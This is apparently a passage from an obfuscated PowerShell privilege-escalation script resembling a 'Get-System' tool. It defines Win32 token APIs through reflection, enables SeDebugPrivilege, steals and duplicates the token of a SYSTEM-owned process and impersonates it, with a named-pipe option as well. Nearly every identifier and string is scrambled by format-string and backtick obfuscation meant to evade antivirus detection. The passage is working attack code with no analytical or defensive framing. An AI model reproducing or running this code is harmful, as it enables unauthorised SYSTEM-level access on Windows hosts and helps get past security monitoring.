        ${TO`keN`p`R`IVile`gest`y`p`EbUIldER} = ${M`odu`L`EbuIlder}.("{3}{2}{0}{1}" -f 'Ty','pe','e','Defin').Invoke(("{2}{3}{1}{0}{4}"-f 'VILEGE','PRI','TOKEN','_','S'), ${A`TtRiB`UTEs}, [System.ValueType])
        ${To`kENPri`ViLe`GeSTy`pEbuiLDer}.("{3}{1}{2}{0}" -f 'eld','fine','Fi','De').Invoke(("{2}{0}{1}"-f 'geCoun','t','Privile'), [UInt32], ("{1}{0}"-f 'ublic','P')) | &("{1}{2}{0}"-f 'ull','O','ut-N')
        ${PRi`Vi`leges`FIe`lD} = ${t`O`KEnPriviLeG`esTYPE`BuI`ldEr}.("{2}{0}{1}" -f'eF','ield','Defin').Invoke(("{0}{2}{1}" -f 'P','leges','rivi'), ${L`Ui`D_And`_A`Tt`R`IbUTESs`TrUcT}.("{1}{2}{0}"-f 'rayType','Make','Ar').Invoke(), ("{0}{1}" -f'Publ','ic'))
        ${aTTRib`Bu`IldeR} = &("{2}{1}{0}" -f 'ct','e','New-Obj') ("{7}{8}{2}{4}{1}{11}{6}{5}{9}{3}{10}{0}" -f 'Builder','n.Em','le','Att','ctio','s','u','Re','f','tom','ribute','it.C')(${conSTRU`ctO`RI`NfO}, ${Con`S`TR`UcTo`RvaL`Ue}, ${f`ielD`Ar`Ray}, @([Int32] 1))
        ${PR`iVil`eg`esFIe`ld}.("{2}{0}{1}{4}{3}"-f'omAtt','r','SetCust','bute','i').Invoke(${atTriBBUI`l`DEr})
        ${T`Ok`e`Np`R`iVILe`GeSStRuCt} = ${T`okeNP`RIvI`LEgeStypeB`Uil`DeR}.("{1}{3}{0}{2}" -f 'y','Create','pe','T').Invoke()

        ${A`Tt`RibbuiL`DEr} = &("{1}{0}{2}" -f'-','New','Object') ("{0}{3}{6}{1}{9}{7}{2}{4}{8}{5}" -f 'Re','ion.E','i','fle','bute','lder','ct','tr','Bui','mit.CustomAt')(
            ( (&("{1}{0}"-f'le','VaRIaB') 8lyg -vAl  ).("{2}{0}{3}{4}{1}" -f'o','ructors','GetC','n','st').Invoke()[0]),
            ("{0}{2}{1}{3}" -f'adva','d','pi32.','ll'),
            @(  (&("{0}{2}{1}" -f'V','E','aRiaBl')  8lyG  -valuE  ).("{1}{0}"-f 'etField','G').Invoke(("{1}{3}{0}{2}" -f 'tE','SetL','rror','as'))),
            @([Bool] ${T`RUe})
        )

        ${at`TribB`Ui`Lder2} = &("{1}{3}{0}{2}"-f 'je','N','ct','ew-Ob') ("{4}{5}{2}{0}{1}{6}{3}"-f'CustomA','tt','t.','ilder','Ref','lection.Emi','ributeBu')(
            ( $8Lyg.("{3}{0}{1}{4}{2}"-f 't','Co','s','Ge','nstructor').Invoke()[0]),
            ("{1}{3}{2}{0}" -f'dll','ke','.','rnel32'),
            @( ( &("{1}{0}" -f'BlE','VaRIA')  8LYG).vaLue.("{0}{1}{2}" -f'Get','Fie','ld').Invoke(("{0}{1}{3}{2}"-f 'Set','LastE','or','rr'))),
            @([Bool] ${tr`UE})
        )

        ${wI`N`3`2`TyPEbUILDer} = ${mo`d`ULeBuiLD`ER}.("{0}{1}{2}" -f 'De','fine','Type').Invoke(("{2}{1}{0}" -f'ethods','32M','Win'), ${ATT`R`IBuTEs}, [ValueType])
        ${WIN`32tyPEBU`i`ld`er}.("{4}{3}{0}{1}{2}"-f 'k','eM','ethod','o','DefinePInv').Invoke(
            ("{1}{0}{2}" -f 'pen','O','Process'),
            ("{1}{0}{3}{2}" -f'nel32.','ker','ll','d'),
            [Reflection.MethodAttributes] ("{2}{0}{1}{3}{4}" -f'lic',', S','Pub','tati','c'),
             (  &("{0}{2}{1}"-f'gET','iABlE','-VaR') ("j"+"heC")).VALUE::"S`TAnDard",
            [IntPtr],
            @([UInt32], [Bool], [UInt32]),
              ( &("{0}{1}"-f 'di','R') ("Va"+"riaBl"+"e:"+"1Btx")).vAlUE::"W`i`NapI",
            ("{0}{1}"-f'Aut','o')).("{0}{2}{1}{4}{3}"-f 'SetCus','omAttribu','t','e','t').Invoke(${aTtRibB`UILDE`R2})

        ${WI`N32`Ty`pEbuIldeR}.("{3}{0}{5}{1}{4}{2}" -f'efine','e','od','D','th','PInvokeM').Invoke(
            ("{1}{0}{2}"-f 'an','CloseH','dle'),
            ("{1}{0}{2}"-f 'rne','ke','l32.dll'),
            [Reflection.MethodAttributes] ("{0}{2}{1}{3}"-f 'Publi',' S','c,','tatic'),
              (  &("{0}{2}{1}" -f'vArIA','Le','b') Jhec ).VAlUe::"s`T`AndarD",
            [Bool],
            @([IntPtr]),
             (&("{0}{1}{2}"-f 'ChiL','DITE','M')  ("vA"+"R"+"Ia"+"BLe:1BT"+"x")).VaLue::"wI`NaPI",
            ("{1}{0}" -f'o','Aut')).("{1}{3}{0}{2}" -f 'mAttribut','SetCu','e','sto').Invoke(${aTTriB`BUi`ldeR2})

        ${Wi`N32t`yPebUild`ER}.("{0}{2}{1}{3}" -f'Defin','InvokeM','eP','ethod').Invoke(
            ("{0}{1}{3}{2}"-f'Du','plic','eToken','at'),
            ("{2}{1}{0}" -f'll','api32.d','adv'),
            [Reflection.MethodAttributes] ("{3}{1}{2}{0}"-f 'lic, Static','u','b','P'),
              (&("{1}{2}{0}"-f'IAbLE','v','aR') JhEc -VALUeon  )::"sta`Nd`ArD",
            [Bool],
            @([IntPtr], [Int32],  (  &('LS')  ('varia'+'BLe:'+'35'+'BJa') ).vaLuE.("{1}{0}{2}" -f 'ByRe','Make','fType').Invoke()),
              ( &("{0}{3}{1}{2}"-f'gE','rIa','BLe','t-vA')  1btx -VALUEon )::"w`i`NaPI",
            ("{1}{0}"-f'to','Au')).("{0}{5}{4}{2}{3}{1}" -f 'Set','ibute','tom','Attr','s','Cu').Invoke(${AT`T`R`Ib`BUiLDEr})

        ${w`iN`32tYPE`B`U`ILDEr}.("{0}{2}{5}{4}{3}{6}{1}"-f'DefinePI','od','nvo','M','e','k','eth').Invoke(
            ("{2}{0}{1}" -f'readToke','n','SetTh'),
            ("{0}{3}{2}{1}" -f 'a','i32.dll','p','dva'),
            [Reflection.MethodAttributes] ("{1}{0}{3}{2}" -f 'ub','P',' Static','lic,'),
              $JHEC::"stANDa`RD",
            [Bool],
            @([IntPtr], [IntPtr]),
              $1btX::"wIN`ApI",
            ("{1}{0}"-f 'o','Aut')).("{0}{2}{1}{3}" -f'S','Custo','et','mAttribute').Invoke(${aT`T`RIbbUI`LdeR})

        ${Win3`2tY`PeB`Uil`Der}.("{1}{2}{3}{0}{4}"-f'nv','Def','ine','PI','okeMethod').Invoke(
            ("{3}{1}{4}{0}{2}"-f 'ce','r','ssToken','OpenP','o'),
            ("{0}{1}{2}" -f'advap','i3','2.dll'),
            [Reflection.MethodAttributes] ("{0}{1}{2}"-f'Pu','bli','c, Static'),
              (&("{0}{2}{3}{1}" -f 'gET','AbLe','-vA','Ri')  ('J'+'hec') ).VALUe::"STA`Nda`RD",
            [Bool],
            @([IntPtr], [UInt32],  (  &("{0}{1}{2}" -f 'VA','RIAbl','e')  ("35"+"bja")  -vAl ).("{1}{0}{2}" -f 'akeByRefTy','M','pe').Invoke()),
             ( &("{1}{0}" -f 'i','GC') variAble:1bTX).vALuE::"wiNA`Pi",
            ("{1}{0}" -f'uto','A')).("{0}{2}{4}{3}{1}" -f 'S','bute','etCust','mAttri','o').Invoke(${AT`Tr`IbbuIld`ER})

        ${w`In32TY`P`EbUiL`Der}.("{4}{2}{0}{3}{1}" -f'Invok','thod','eP','eMe','Defin').Invoke(
            ("{1}{3}{4}{0}{2}"-f'u','Look','e','upPrivilegeV','al'),
            ("{2}{1}{0}" -f 'l','32.dl','advapi'),
            [Reflection.MethodAttributes] ("{0}{3}{2}{1}"-f'Pu','atic','lic, St','b'),
              $JHec::"S`TA`NDaRd",
            [Bool],
            @([String], [String],   $35bjA.("{0}{3}{1}{2}{4}" -f 'Ma','eByRe','fT','k','ype').Invoke()),
              $1bTX::"wIN`A`pI",
            ("{0}{1}"-f 'Au','to')).("{0}{3}{1}{4}{2}" -f'SetCustom','r','te','Att','ibu').Invoke(${attRI`Bb`UIL`der})

        ${W`i`N3`2`TypEbUiLd`ER}.("{3}{4}{5}{2}{0}{1}"-f 'eMeth','od','k','Def','inePInv','o').Invoke(
            ("{2}{3}{1}{4}{0}"-f 's','okenPr','Adjust','T','ivilege'),
            ("{0}{1}{2}"-f'a','dv','api32.dll'),
            [Reflection.MethodAttributes] ("{1}{3}{0}{2}"-f'lic, St','Pu','atic','b'),
             (&("{0}{1}"-f'vARiab','LE') ("jhE"+"C")).vaLue::"Sta`NDA`RD",
            [Bool],
            @([IntPtr], [Bool], ${TOkpRIv`1`Lu`Id`S`T`RUCT}.("{2}{3}{0}{1}"-f'yRefT','ype','M','akeB').Invoke(),[Int32], [IntPtr], [IntPtr]),
              $1BTx::"WIna`PI",
            ("{1}{0}"-f'o','Aut')).("{1}{3}{2}{5}{4}{0}"-f'e','S','t','e','but','CustomAttri').Invoke(${aT`TR`iBb`UILdeR})
        
        ${W`In32mETH`O`DS} = ${wiN`32TY`PeBuIL`Der}.("{0}{1}{2}"-f'Creat','eTyp','e').Invoke()

        ${wIn32`Na`T`Ive} =   $jfy."aSSE`mBly".("{0}{2}{1}"-f 'Ge','pes','tTy').Invoke() | &('?') {${_}."n`AmE" -eq ("{0}{2}{3}{1}"-f'Win','e','32','Nativ')}
        ${Get`cur`R`EN`TPR`Ocess} = ${win`32`NaTI`VE}.("{1}{0}"-f 'Method','Get').Invoke(
            ("{2}{0}{1}{3}"-f'tCur','rentP','Ge','rocess'),
            [Reflection.BindingFlags] ("{4}{0}{1}{3}{2}" -f 'b','lic,','tatic',' S','NonPu')
        )
            
        ${Se`_prI`ViLeGe`_e`N`ABlEd} = 0x00000002
        ${sTA`NdARD_`Ri`GhtS`_REQ`UirEd} = 0x000F0000
        ${staN`da`RD_rIgHTs_`READ} = 0x00020000
        ${t`okEn_ASs`iGn_`p`RI`mary} = 0x00000001
        ${T`o`kEn`_DU`pliCaTe} = 0x00000002
        ${tO`KEn`_i`MpErSo`NaTE} = 0x00000004
        ${T`oKen`_qU`erY} = 0x00000008
        ${tOKe`N`_QueRY`_SOURcE} = 0x00000010
        ${tokeN_A`djUST_`pri`V`il`e`GEs} = 0x00000020
        ${To`KEn_ADJU`st_`GR`Ou`ps} = 0x00000040
        ${T`o`ken`_Ad`JusT_d`E`FauLt} = 0x00000080
        ${tOKEn_Ad`juST`_sEssio`Nid} = 0x00000100
        ${t`OKEN`_reaD} = ${ST`AndARd_r`I`GHTS_`RE`AD} -bor ${ToK`eN`_QUErY}
        ${tokEn`_al`l_`Ac`cESs} = ${sTaND`AR`D_riG`hTS_`REquIr`ed} -bor
            ${TOKen_`ASs`I`gN_pRIm`A`RY} -bor
            ${to`k`En`_DUplICaTe} -bor
            ${TokEn_I`m`p`ERSoNaTe} -bor
            ${to`K`EN_`Query} -bor
            ${ToK`En_quE`Ry_s`ourCE} -bor
            ${T`OKeN_`ADJUSt_`p`Ri`V`IlEGES} -bor
            ${toKeN`_ad`J`UST_GROuPS} -bor
            ${T`OK`en`_a`Dj`UST_DefauLt} -bor
            ${ToKE`N_ADjUsT`_S`Essi`o`Nid}

        [long]${L`UId} = 0

        ${T`OK`PriV1L`UID} =  (  &("{0}{1}"-f 'V','aRIAbLE') vd2i  -VaLUe)::("{1}{2}{3}{0}"-f'stance','Creat','e','In').Invoke(${t`okprIv1`l`UiDsTru`ct})
        ${tOkpR`I`V1l`UId}."C`oUnT" = 1
        ${to`kpRiv`1`luId}."lu`iD" = ${l`UiD}
        ${TOk`P`RIv1l`Uid}."A`TTr" = ${sE_`PRI`VILEGE`_`EnABl`eD}

        ${ReT`VaL} = ${w`IN32m`ETH`oDS}::("{3}{4}{0}{1}{2}"-f'V','al','ue','Lo','okupPrivilege').Invoke(${N`UlL}, ("{1}{0}{2}"-f 'bugP','SeDe','rivilege'), [ref]${ToKPrIV1l`U`iD}."L`UId")

        ${h`ToKEn} =  ( &("{1}{3}{0}{2}"-f 'E','GET-c','m','hIlDIT')  ("vAriAb"+"l"+"E:35"+"bja")  ).VaLue::"ze`RO"
        ${r`eTval} = ${WI`N3`2METhODS}::("{2}{5}{3}{1}{4}{0}" -f'ken','roc','Op','nP','essTo','e').Invoke(${getcuRR`entp`R`OCess}."inV`OKE"(${n`ULL}, @()), ${toke`N_aL`L`_AcceSs}, [ref]${Hto`keN})

        ${toKE`Np`R`I`VilegES} =   (&('gI') Variable:vD2I).vAlUe::("{3}{2}{0}{1}"-f'ateI','nstance','e','Cr').Invoke(${tOKEnpRI`V`Ile`GeSstRu`Ct})
        ${r`e`TvAL} = ${w`i`N`32`MethoDS}::"a`dJu`SttOK`En`PrIV`ilEGEs"(${ht`OKeN}, ${F`AlSe}, [ref]${To`k`prIv1`lUid}, 12,   (  &('gi')  VarIablE:35BJa).vaLUe::"ze`RO",  (  &('gi')  ('VaRI'+'A'+'BlE:3'+'5'+'BJA') ).VALue::"Z`eRo")

        if(-not(${r`eTVAl})) {
            &("{2}{1}{0}"-f'Error','rite-','W') ('Adj'+'ustTo'+'ken'+'Pr'+'iv'+'ile'+'ges '+'fa'+'i'+'led, '+'RetVa'+'l'+' '+': '+"$RetVal") -ErrorAction ("{0}{1}" -f'S','top')
        }
        
        ${LocAlsyS`TE`mNt`ACc`oUnt} = (&("{2}{1}{0}"-f 't','-Objec','New') -TypeName ("{3}{6}{7}{2}{4}{1}{5}{9}{8}{0}"-f 'er','.S','curity.Pr','Sys','incipal','ecurit','te','m.Se','fi','yIdenti') -ArgumentList (  $AW5l::("{1}{0}{2}{3}"-f'S','Local','ystemSi','d'), ${nU`ll}))."TRa`N`slATe"([Security.Principal.NTAccount])."v`AlUe"

        ${S`ySTE`mhAndLe} = &("{0}{3}{1}{2}" -f 'G','t-WmiO','bject','e') -Class ("{2}{1}{0}"-f 'rocess','P','Win32_') | &("{3}{2}{0}{4}{1}" -f 'ch-','ct','a','ForE','Obje') {
            try {
                ${o`wnERI`NFO} = ${_}.("{0}{1}{2}" -f'GetOw','n','er').Invoke()
                if (${oWNe`RIn`Fo}."dOmA`iN" -and ${OW`N`ERINfo}."u`SEr") {
                    ${Ow`Ners`T`RINg} = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".("{1}{2}{0}" -f'Upper','T','o').Invoke()

                    if (${OWnEr`STR`I`NG} -eq ${lO`C`Alsy`sTE`M`NtaCCOUNT}.("{0}{2}{1}" -f'To','per','Up').Invoke()) {
                        ${p`ROC`ESs} = &("{1}{0}{2}"-f't-Proces','Ge','s') -Id ${_}."PrOcES`SiD"

                        ${h`ANd`lE} = ${WIn`32`mE`THODs}::("{1}{0}{2}" -f 'oc','OpenPr','ess').Invoke(0x0400, ${f`A`Lse}, ${Pr`OC`ESs}."iD")
                        if (${h`An`dle}) {
                            ${h`And`LE}
                        }
                    }
                }
            }
            catch {}
        } | &("{0}{2}{3}{1}" -f 'Whe','ject','r','e-Ob') {${_} -and (${_} -ne 0)} | &("{2}{0}{1}" -f'el','ect','S') -First 1
        
        if ((-not ${S`Y`Ste`m`hAnDle}) -or (${sYS`T`eMhan`dlE} -eq 0)) {
            &("{0}{1}{2}" -f'Wr','ite-Erro','r') ("{4}{3}{0}{1}{11}{12}{7}{2}{5}{6}{9}{8}{10}" -f 'b','ta','sys','o o','Unable t','te','m',' a handle to a ','roces',' p','s.','i','n')
        } 
        else {
            [IntPtr]${sy`S`TemtOK`En} =  (&("{1}{0}"-f 'r','di') ("vAR"+"Iab"+"L"+"E:"+"35bjA") ).vAlUE::"Z`Ero"
            ${retV`Al} = ${w`IN32`m`eTho`Ds}::"oP`E`NPr`Oc`EsSt`oKen"(([IntPtr][Int] ${sY`sT`emHA`ND`lE}), (${tOKeN_IM`Per`S`onATe} -bor ${TO`KEn`_`DUplicaTE}), [ref]${SYsTem`T`oKen});${lAS`Te`RRor} = [ComponentModel.Win32Exception]  (&("{0}{2}{3}{1}"-f 'Ge','Ble','t-VaR','Ia')  ("U"+"o"+"B9qc") -vaLUEo  )::("{1}{4}{2}{3}{0}" -f'ror','GetLastW','n','32Er','i').Invoke()

            &("{2}{3}{4}{1}{0}" -f 'ose','rb','Writ','e-','Ve') ('OpenProce'+'s'+'sToke'+'n '+'r'+'esult:'+' '+"$RetVal")
            &("{0}{1}{2}{3}"-f 'Write-','Ve','rbo','se') ('OpenP'+'roc'+'essTo'+'ke'+'n '+'resu'+'lt: '+"$LastError")

            [IntPtr]${dulIc`A`TeT`OK`eNHAnDle} =   ( &("{1}{0}{2}" -f 'iABl','VaR','E') ("3"+"5bjA") -VAlU  )::"z`eRo"
            ${re`TVaL} = ${WI`N3`2mEt`HO`ds}::"d`UpL`IC`AteTokEn"(${S`yS`TEmT`OkeN}, 2, [ref]${DuLiCat`E`T`OK`EN`HAnDLe});${Las`TE`Rror} = [ComponentModel.Win32Exception]  $UoB9qc::("{3}{2}{5}{1}{4}{0}"-f'r','32Err','tLa','Ge','o','stWin').Invoke()

            &("{1}{0}{2}" -f'rite','W','-Verbose') ('Dup'+'l'+'icateT'+'ok'+'en '+'res'+'ult: '+"$LastError")

            ${reT`V`Al} = ${W`iN`32`meThOds}::"S`eTtH`R`Ea`dtokEN"(  (  &("{0}{1}{2}" -f'V','aR','iaBLe')  35BJa -VAlueONLy  )::"zE`RO", ${DulIc`AT`ET`okenHa`N`dlE});${Las`TEr`RoR} = [ComponentModel.Win32Exception]  (&("{0}{1}" -f 'it','eM') ("vARIAbL"+"e:"+"Uob9q"+"c")).VALUE::("{5}{1}{2}{3}{4}{0}" -f'2Error','ast','Wi','n','3','GetL').Invoke()
            if(-not(${R`E`TVAl})) {
                &("{1}{0}{2}{3}" -f '-Er','Write','r','or') ('Se'+'t'+'Threa'+'dToke'+'n '+'fa'+'iled'+', '+'RetVa'+'l'+' '+': '+"$RetVal") -ErrorAction ("{0}{1}"-f 'St','op')
            }

            &("{1}{2}{0}{3}" -f'e-Ve','W','rit','rbose') ('S'+'etT'+'hre'+'adTo'+'ken '+'r'+'esu'+'lt: '+"$LastError")
            ${Nu`lL} = ${wi`N32mE`T`hOdS}::("{3}{1}{2}{0}"-f'e','loseHand','l','C').Invoke(${HA`NDlE})
        }
    }

    if (-not ([Security.Principal.WindowsPrincipal]   (&('gI') ("vaRI"+"Able"+":bJ"+"F") ).VaLUe::("{3}{1}{0}{2}" -f 'C','t','urrent','Ge').Invoke())."i`sINR`Ole"([Security.Principal.WindowsBuiltInRole] ("{1}{0}{2}"-f'istrato','Admin','r'))) {
        &("{2}{0}{1}" -f '-E','rror','Write') ("{1}{4}{2}{0}{3}{5}{6}" -f'min','Scri','t be run as ad','istr','pt mus','a','tor') -ErrorAction ("{0}{1}" -f'St','op')
    }

    if( (  &("{1}{0}{2}{3}"-f '-vari','GEt','ABL','e') ("sY"+"T")  -va )::"curReNT`T`h`ReAd".("{2}{0}{1}{3}" -f'part','mentStat','GetA','e').Invoke() -ne 'STA') {
        &("{0}{1}{2}" -f 'Wr','i','te-Error') ("{4}{19}{18}{7}{9}{6}{12}{20}{14}{8}{1}{5}{13}{0}{11}{10}{16}{17}{2}{3}{15}"-f'l','o','S','TA f','Scrip','wer',' ','un in S','unch p','TA','i','.exe w','mode, ','shel','ela','lag','t','h -','r','t must be ','r') -ErrorAction ("{1}{0}" -f'op','St')
    }

    if(${P`S`BOuNdP`ArAm`ETErs}[("{1}{0}"-f 'AmI','Who')]) {
        &("{3}{2}{1}{0}" -f't','pu','t','Write-Ou') "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        return
    }

    elseif(${ps`BOUnDP`AR`AMeTe`RS}[("{2}{0}{1}"-f'vToSel','f','Re')]) {
        ${reV`er`Tt`o`seLfAddr} = &("{0}{2}{4}{1}{3}" -f 'Get-Pro','res','cA','s','dd') ("{2}{0}{3}{1}" -f 'v','2.dll','ad','api3') ("{2}{1}{0}"-f 'Self','o','RevertT')
        ${ReVe`R`TT`OS`Elf`deLEgatE} = &("{0}{1}{3}{2}"-f'Get-D','elegateTy','e','p') @() ([Bool])
        ${reve`R`TTos`Elf} =  (&("{1}{0}" -f'RiABlE','va')  azfPO0 ).vaLUe::("{1}{0}{3}{2}{5}{4}{6}" -f'etD','G','onPoin','elegateForFuncti','e','t','r').Invoke(${rev`ERtTo`S`Elf`AD`Dr}, ${Rev`ERttoSE`lF`DelegATe})

        ${r`et`VAl} = ${R`eVE`RTt`Ose`LF}."I`NV`OKE"()
        if(${r`ETVaL}) {
            &("{2}{1}{0}"-f 'put','t','Write-Ou') ("{3}{4}{1}{0}{2}" -f'Se','o','lf successful.','Rev','ertT')
        }
        else {
            &("{1}{0}{2}" -f'War','Write-','ning') ("{2}{1}{6}{4}{3}{5}{0}" -f'.','tTo','Rever','il','elf fa','ed','S')
        }
        &("{3}{1}{2}{0}" -f'tput','ite-','Ou','Wr') "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
    }

    else {
        if(${TECh`NI`QUe} -eq ("{0}{1}{2}" -f'Na','m','edPipe')) {
            
            &("{3}{1}{2}{0}"-f 'mNamedPipe','s','te','Get-Sy') -ServiceName ${SeR`VIC`ENa`ME} -PipeName ${P`IP`ename}
        }
        else {
            
            &("{1}{2}{0}{4}{3}" -f't','G','e','mToken','-Syste')
        }
        &("{0}{2}{1}"-f 'Wri','e-Output','t') "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
    }
}